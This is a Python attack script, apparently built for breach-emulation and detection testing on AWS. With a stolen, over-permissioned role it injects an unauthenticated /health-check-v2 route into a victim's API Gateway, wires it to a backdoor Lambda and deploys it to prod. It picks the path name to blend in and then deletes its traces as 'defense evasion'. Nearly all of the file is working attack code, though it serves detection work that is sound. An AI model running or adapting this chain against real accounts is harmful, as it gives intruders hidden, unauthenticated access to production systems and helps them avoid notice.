# FILE: attack.py
"""
ATOMIC_APIGATEWAY_BACKDOOR_PROXY - Automated Attack Script
API Gateway Backdoor Proxy Injection via Over-Permissioned DevOps Role (T1190)

Phases:
  1. Credential Acquisition  - Assume Compromised Victim Role (STS AssumeRole)
  2. Discovery               - Enumerate Victim API Resources (GetResources)
  3. Backdoor Injection      - CreateResource + PutMethod + PutIntegration +
                               AddPermission + CreateDeployment (prod live)
  4. Cleanup (finally)       - RemovePermission + DeleteResource + CreateDeployment restore
"""
import sys
import time
import random
import json
import pathlib
import os

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# ── Resource names: single source of truth ──────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} - names will fall back to outputs/env vars")

_R   = _NAMES.get("resources", {})           # static names
_PKS = _NAMES.get("pulumi_export_keys", {})  # semantic key -> pulumi export key


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, env_var=None, default=""):
    """Resolve a static resource name: resource_names.json > env var > default."""
    return _R.get(key) or (os.environ.get(env_var, default) if env_var else default)


def _p(infra, key, env_var=None, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> infra dict -> env var -> default."""
    export_key = _PKS.get(key, key)
    return infra.get(export_key) or (os.environ.get(env_var, default) if env_var else default)


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    # ── Resolve required outputs ─────────────────────────────────────────────
    _set_tenant_credentials(outputs)

    compromised_victim_role_arn = _p(outputs, "compromised_victim_role_arn")
    if not compromised_victim_role_arn:
        raise RuntimeError("Missing required output: compromised_victim_role_arn")

    victim_rest_api_id = _p(outputs, "victim_rest_api_id")
    if not victim_rest_api_id:
        raise RuntimeError("Missing required output: victim_rest_api_id")

    backdoor_lambda_arn = _p(outputs, "backdoor_lambda_arn")
    if not backdoor_lambda_arn:
        raise RuntimeError("Missing required output: backdoor_lambda_arn")

    # Static names from resource_names.json['resources']
    backdoor_lambda_name = _r("backdoor_lambda_name")
    if not backdoor_lambda_name:
        raise RuntimeError("Missing static resource name: backdoor_lambda_name in resource_names.json")

    api_stage_name = _r("api_stage_name", default="prod")

    print_ok(f"Static names resolved from resource_names.json:")
    print_ok(f"  backdoor_lambda_name = {backdoor_lambda_name}")
    print_ok(f"  api_stage_name       = {api_stage_name}")
    print_ok(f"Dynamic outputs resolved from Pulumi stack:")
    print_ok(f"  victim_rest_api_id          = {victim_rest_api_id}")
    print_ok(f"  compromised_victim_role_arn = {compromised_victim_role_arn}")
    print_ok(f"  backdoor_lambda_arn         = {backdoor_lambda_arn}")

    # ── Phase 1: Credential Acquisition ─────────────────────────────────────
    # AssumeRole using ambient pipeline executor credentials.
    # The compromised victim role is over-permissioned on apigateway:* scoped
    # to the victim API ARN prefix - represents a leaked DevOps role credential.
    print_step("Phase 1 - Credential Acquisition: Assume Compromised Victim Role (T1190)")
    print_step("Step 1: AssumeRole -> compromised victim IAM role (over-permissioned DevOps role)")

    sts_client = _base_session(region).client("sts")
    try:
        assume_resp = sts_client.assume_role(
            RoleArn=compromised_victim_role_arn,
            RoleSessionName="apigateway-backdoor-emulation",
            DurationSeconds=3600,
        )
    except ClientError as e:
        raise RuntimeError(
            f"AssumeRole failed for {compromised_victim_role_arn}: {e}"
        ) from e

    creds = assume_resp["Credentials"]
    print_ok(f"AssumeRole succeeded - session expires {creds['Expiration']}")

    # Build the victim session used for all subsequent API calls
    victim_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )

    # Confirm session validity; capture account_id for SourceArn construction in Step 6
    victim_sts = victim_session.client("sts")
    try:
        identity = victim_sts.get_caller_identity()
        account_id = identity["Account"]
        print_ok(f"GetCallerIdentity: account={account_id}, arn={identity['Arn']}")
    except ClientError as e:
        raise RuntimeError(f"GetCallerIdentity failed: {e}") from e

    op_delay(2, 4)

    # Build per-service clients from the victim session
    victim_apigw = victim_session.client("apigateway", region_name=region)
    victim_lambda_client = victim_session.client("lambda", region_name=region)

    # ── All steps after this point mutate victim resources.
    # The try/finally below guarantees cleanup runs even if any step fails mid-chain.
    # backdoor_resource_id and permission_added track which resources were created
    # so the finally block knows exactly what to clean up.
    backdoor_resource_id = None
    permission_added = False

    try:
        phase_delay()

        # ── Phase 2: Discovery ───────────────────────────────────────────────
        print_step("Phase 2 - Discovery: Enumerate Victim API Resources (T1190)")
        print_step("Step 2: GetResources -> resolve root resource ID from victim REST API")

        try:
            resources_resp = victim_apigw.get_resources(
                restApiId=victim_rest_api_id,
                limit=25,
            )
        except ClientError as e:
            raise RuntimeError(f"GetResources failed: {e}") from e

        root_resource_id = None
        for item in resources_resp.get("items", []):
            if item.get("path") == "/":
                root_resource_id = item["id"]
                break

        if not root_resource_id:
            raise RuntimeError(
                "Could not find root resource (path='/') in victim API resources"
            )

        existing_paths = [i.get("path", "") for i in resources_resp.get("items", [])]
        print_ok(f"Root resource ID: {root_resource_id}")
        print_ok(f"Existing API paths (pre-attack baseline): {existing_paths}")

        op_delay(2, 4)
        phase_delay()

        # ── Phase 3: Backdoor Injection ──────────────────────────────────────
        print_step(
            "Phase 3 - Backdoor Injection: Create Route, Wire Lambda, Deploy to prod (T1190)"
        )

        # Step 3: CreateResource - inject /health-check-v2 as child of root resource.
        # Path chosen to blend with legitimate health-check infrastructure.
        print_step(
            "Step 3: CreateResource -> inject /health-check-v2 as child of root resource"
        )
        try:
            create_resp = victim_apigw.create_resource(
                restApiId=victim_rest_api_id,
                parentId=root_resource_id,
                pathPart="health-check-v2",
            )
            backdoor_resource_id = create_resp["id"]
            print_ok(
                f"CreateResource succeeded: /health-check-v2 resource_id={backdoor_resource_id}"
            )
        except ClientError as e:
            raise RuntimeError(f"CreateResource failed: {e}") from e

        op_delay(2, 5)

        # Step 4: PutMethod - GET with authorizationType=NONE (primary detection IOC).
        # authorizationType=NONE removes all authentication on this route, making it
        # publicly accessible without IAM credentials, Cognito tokens, or a Lambda
        # authorizer. Detection signal: unauthenticated sibling route on an API where
        # the existing /data route has legitimate authorization in the baseline deployment.
        print_step(
            "Step 4: PutMethod -> GET /health-check-v2 authorizationType=NONE (unauthenticated route)"
        )
        try:
            victim_apigw.put_method(
                restApiId=victim_rest_api_id,
                resourceId=backdoor_resource_id,
                httpMethod="GET",
                authorizationType="NONE",
                apiKeyRequired=False,
            )
            print_ok(
                "PutMethod succeeded: GET /health-check-v2 authorizationType=NONE - "
                "unauthenticated route configured"
            )
        except ClientError as e:
            raise RuntimeError(f"PutMethod failed: {e}") from e

        op_delay(1, 3)

        # Step 5: PutIntegration - wire backdoor Lambda via AWS_PROXY.
        # integrationHttpMethod must be POST for Lambda proxy integrations regardless
        # of the method's httpMethod - this is an API Gateway requirement.
        print_step(
            "Step 5: PutIntegration -> wire GET /health-check-v2 to backdoor Lambda via AWS_PROXY"
        )
        integration_uri = (
            f"arn:aws:apigateway:{region}:lambda:path/2015-03-31"
            f"/functions/{backdoor_lambda_arn}/invocations"
        )
        print_ok(f"Integration URI: {integration_uri}")
        try:
            victim_apigw.put_integration(
                restApiId=victim_rest_api_id,
                resourceId=backdoor_resource_id,
                httpMethod="GET",
                type="AWS_PROXY",
                integrationHttpMethod="POST",
                uri=integration_uri,
            )
            print_ok(
                "PutIntegration succeeded: AWS_PROXY -> backdoor Lambda wired to /health-check-v2"
            )
        except ClientError as e:
            raise RuntimeError(f"PutIntegration failed: {e}") from e

        op_delay(1, 3)

        # Step 6: AddPermission - grant API Gateway prod stage invoke on backdoor Lambda.
        # SourceArn scoped to the exact invoke path (prod/GET/health-check-v2) to minimize
        # blast radius. StatementId reused by remove_permission in Step 8.
        # account_id captured from GetCallerIdentity in Step 1.
        print_step(
            f"Step 6: AddPermission -> grant API Gateway "
            f"{api_stage_name}/GET/health-check-v2 invoke on backdoor Lambda"
        )
        source_arn = (
            f"arn:aws:execute-api:{region}:{account_id}"
            f":{victim_rest_api_id}/{api_stage_name}/GET/health-check-v2"
        )
        print_ok(f"SourceArn: {source_arn}")
        try:
            victim_lambda_client.add_permission(
                FunctionName=backdoor_lambda_name,
                StatementId="apigateway-backdoor-invoke",
                Action="lambda:InvokeFunction",
                Principal="apigateway.amazonaws.com",
                SourceArn=source_arn,
            )
            permission_added = True
            print_ok(
                f"AddPermission succeeded: StatementId=apigateway-backdoor-invoke "
                f"on backdoor Lambda {backdoor_lambda_name}"
            )
        except ClientError as e:
            raise RuntimeError(f"AddPermission failed: {e}") from e

        op_delay(1, 3)

        # Step 7: CreateDeployment - activate backdoor route in prod stage.
        # After this deployment, unauthenticated GET /health-check-v2 is live and
        # forwards requests to the backdoor Lambda. This is the moment of exposure.
        print_step(
            f"Step 7: CreateDeployment -> activate /health-check-v2 in {api_stage_name} stage"
        )
        try:
            deploy_resp = victim_apigw.create_deployment(
                restApiId=victim_rest_api_id,
                stageName=api_stage_name,
                description="health-check-v2 route update",
            )
            print_ok(
                f"CreateDeployment succeeded: deployment_id={deploy_resp['id']} - "
                f"backdoor route LIVE in {api_stage_name} stage"
            )
        except ClientError as e:
            raise RuntimeError(f"CreateDeployment (activate) failed: {e}") from e

        # Dwell period: allow detection window before cleanup begins
        print_step("Dwell: 10-20s detection window before cleanup")
        op_delay(10, 20)

    finally:
        # ── Phase 4: Cleanup (always runs - even on exception) ───────────────
        # This block runs whether the attack chain succeeded, partially executed,
        # or raised at any point. Guards on permission_added and backdoor_resource_id
        # ensure only resources that were actually created are cleaned up.
        print_step(
            "Phase 4 - Cleanup: Revoke Permission, Delete Route, Restore Stage "
            "(Defense Evasion)"
        )

        # Step 8: RemovePermission - revoke backdoor Lambda invoke permission.
        # Only attempted if AddPermission in Step 6 completed successfully.
        if permission_added:
            print_step(
                f"Step 8: RemovePermission -> revoke StatementId=apigateway-backdoor-invoke "
                f"from backdoor Lambda {backdoor_lambda_name}"
            )
            try:
                victim_lambda_client.remove_permission(
                    FunctionName=backdoor_lambda_name,
                    StatementId="apigateway-backdoor-invoke",
                )
                print_ok(
                    "RemovePermission succeeded: apigateway-backdoor-invoke removed "
                    "from backdoor Lambda"
                )
            except ClientError as e:
                err_code = e.response.get("Error", {}).get("Code", "")
                if err_code in ("ResourceNotFoundException", "ResourceNotFound"):
                    print_err(
                        f"RemovePermission: statement not found (already removed?): {e}"
                    )
                else:
                    print_err(f"RemovePermission failed (non-fatal, continuing cleanup): {e}")
            op_delay(1, 2)
        else:
            print_step("Step 8: Skipping RemovePermission - AddPermission was not called")

        # Step 9: DeleteResource - remove /health-check-v2 resource.
        # Cascades to delete the GET method and AWS_PROXY integration under it.
        # Only attempted if CreateResource in Step 3 succeeded (backdoor_resource_id set).
        resource_deleted = False
        if backdoor_resource_id is not None:
            print_step(
                "Step 9: DeleteResource -> remove /health-check-v2 "
                "(cascades to GET method and AWS_PROXY integration)"
            )
            try:
                victim_apigw.delete_resource(
                    restApiId=victim_rest_api_id,
                    resourceId=backdoor_resource_id,
                )
                resource_deleted = True
                print_ok(
                    "DeleteResource succeeded: /health-check-v2 and all child "
                    "methods/integrations removed"
                )
            except ClientError as e:
                err_code = e.response.get("Error", {}).get("Code", "")
                if err_code in ("NotFoundException", "ResourceNotFoundException"):
                    # Already gone - treat as success for restore decision
                    resource_deleted = True
                    print_err(
                        f"DeleteResource: resource not found (already deleted?): {e}"
                    )
                else:
                    print_err(f"DeleteResource failed: {e}")
            op_delay(2, 4)

            # Step 10: CreateDeployment - restore prod stage to pre-attack state.
            # ONLY run if Step 9 succeeded. If the resource still exists, a restore
            # deployment would re-activate the backdoor, so we skip it on failure.
            if resource_deleted:
                print_step(
                    f"Step 10: CreateDeployment -> restore {api_stage_name} stage "
                    f"to pre-attack state (no /health-check-v2)"
                )
                try:
                    restore_resp = victim_apigw.create_deployment(
                        restApiId=victim_rest_api_id,
                        stageName=api_stage_name,
                        description="revert health-check-v2 route",
                    )
                    print_ok(
                        f"CreateDeployment succeeded: {api_stage_name} stage restored "
                        f"deployment_id={restore_resp['id']}"
                    )
                except ClientError as e:
                    print_err(
                        f"CreateDeployment (restore) failed (non-fatal, stage may need "
                        f"manual redeploy): {e}"
                    )
                op_delay(2, 5)
            else:
                print_err(
                    f"Step 10: Skipping restore deployment - delete_resource failed. "
                    f"{api_stage_name} stage NOT redeployed to avoid re-activating the "
                    f"backdoor route. Manual remediation required: delete /health-check-v2 "
                    f"and redeploy."
                )
        else:
            print_step(
                "Steps 9+10: Skipping - backdoor resource was never created "
                "(CreateResource in Step 3 did not succeed)"
            )

    # ── Execution Summary ─────────────────────────────────────────────────────
    print("\n" + "=" * 65)
    print("ATOMIC_APIGATEWAY_BACKDOOR_PROXY - Execution Summary")
    print("=" * 65)
    print("MITRE ATT&CK: T1190 (Exploit Public-Facing Application)")
    print("Tactics: Initial Access, Discovery, Persistence, Defense Evasion")
    print("")
    print("CloudTrail events generated:")
    print("  Phase 1 - Credential Acquisition:")
    print("    [sts] AssumeRole: assumed compromised-victim-role")
    print("    [sts] GetCallerIdentity: confirmed session validity")
    print("  Phase 2 - Discovery:")
    print("    [apigateway] GetResources: enumerated victim REST API paths")
    print("  Phase 3 - Persistence (Backdoor Injection):")
    print("    [apigateway] CreateResource: /health-check-v2 on victim API")
    print("    [apigateway] PutMethod: GET authorizationType=NONE (unauthenticated route)")
    print("    [apigateway] PutIntegration: AWS_PROXY -> attacker Lambda wired")
    print("    [lambda] AddPermission20150331v2: API Gateway granted invoke on backdoor Lambda")
    print(f"    [apigateway] CreateDeployment: {api_stage_name} stage activated with backdoor route")
    print("  Phase 4 - Defense Evasion (Cleanup):")
    print("    [lambda] RemovePermission: apigateway-backdoor-invoke revoked")
    print("    [apigateway] DeleteResource: /health-check-v2 removed (cascades method+integration)")
    print(f"    [apigateway] CreateDeployment: {api_stage_name} stage restored to pre-attack state")
    print("=" * 65)
